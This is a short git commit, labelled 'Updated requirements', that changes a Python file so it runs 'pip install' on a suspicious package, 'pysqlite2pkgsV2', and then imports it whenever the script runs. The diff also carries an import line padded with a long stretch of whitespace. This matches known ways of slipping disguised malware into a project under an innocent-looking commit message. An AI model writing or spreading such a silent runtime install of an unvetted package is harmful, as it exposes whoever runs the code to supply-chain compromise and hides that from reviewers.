18d5b002b4a7879d4098f6e48eabc2d70e93156b
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-08-06 09:34:29 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlitedbextV1")
-import pysqlitedbextV1
+os.system("pip install pysqlite2pkgsV2")
+import pysqlite2pkgsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
